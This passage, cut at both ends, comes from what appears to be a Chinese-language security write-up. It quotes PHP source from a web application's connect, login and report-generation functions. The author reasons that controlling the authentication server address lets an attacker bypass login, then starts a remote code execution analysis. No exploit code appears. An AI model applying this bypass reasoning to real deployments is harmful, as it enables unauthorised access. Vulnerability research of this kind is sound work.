style="color: rgb(0, 128, 128); font-size: 13px;">socket_last_error</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$errormsg</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">socket_strerror</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$errorcode</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">die</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"Couldn't create socket: [<span style="font-size: 13px;">$errorcode</span>]&nbsp;<span style="font-size: 13px;">$errormsg</span>&nbsp;<span style="color: rgb(192, 48, 48); font-size: 13px;">\n</span>"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">!</span><span style="color: rgb(0, 128, 128); font-size: 13px;">socket_connect</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">,</span>&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$ip</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$port</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$error</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"could not connect"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">return</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">else</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">return</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">return</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p>代码对用户输入的服务端参数创建了一个原始套接字连接，再回到index.php文件第37和39行，可以看到用户输入用户名密码进行身份认证，第43行，如果输入有效则认证成功。站在攻击者角度来看，只要能控制服务端认证参数，就能绕过认证过程。</p>
<h2>远程代码执行尝试</h2>
<p>现在，我们来研究源码中究竟什么输入是认证服务端可信的。经过一番折腾后发现，genratereports.php文件有点意思，从名称上看，它似乎是用来生成某种报告的。</p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$gid</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">isset</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_GET</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"grid_id"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span>?<span style="color: rgb(160, 128, 0); font-size: 13px;">$_GET</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"grid_id"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">:</span><span style="color: rgb(192, 48, 48); font-size: 13px;">''</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$id</span><span style="color: rgb(0, 0, 0); font-size: 13px;">!=</span><span style="color: rgb(0, 128, 160); font-size: 13px;">0</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&amp;&amp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$daterange</span><span style="color: rgb(0, 0, 0); font-size: 13px;">!=</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&amp;&amp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$path</span><span style="color: rgb(0, 0, 0); font-size: 13px;">!=</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&amp;&amp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$gid</span><span style="color: rgb(0, 0, 0); font-size: 13px;">==</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$port</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 128, 160); font-size: 13px;">1056</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>login<span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$ip</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span>&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$port</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span>&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$password</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">604</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendtags</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendstringtoserver</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$id</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendstringtoserver</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$path</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$columnamestr</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>getstringfromserver<span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$columname</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">genratecolumnname</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$columnamestr</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">session_start</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$_SESSION</span><span style="color: rgb(0, 0, 0); font-size: 13px;">[</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"columname"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">]</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$columname</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">session_write_close</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$columname</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">603</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendtags</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendstringtoserver</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$daterange</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;&nbsp;&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendstringtoserver</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$id</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;&nbsp;&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">sendstringtoserver</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$path</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$filename</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>getfilefromremote<span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$filename</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$restore_file</span>&nbsp;&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(192, 48, 48); font-size: 13px;">"temp/"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$filename</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(192, 48, 48); font-size: 13px;">".sql"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span>createdb<span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$restore_file</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sessionnumber</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></span></p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></span></p>
<p>从代码层面上看来，包含GET参数grid_id的变量$gid在设置过程中存在问题，之后，结合用户名密码，login()被调用。</p>
<p>login()函数实际上与config.php中的认证会话本质上是一样的：</p>
<p><span style="color: rgb(32, 96, 160); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(32, 96, 160); font-size: 13px;">function</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;login</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$ip</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$port</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$password</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">connect&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$ip</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$port</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sock</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$data</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">601</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//authenticate login</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 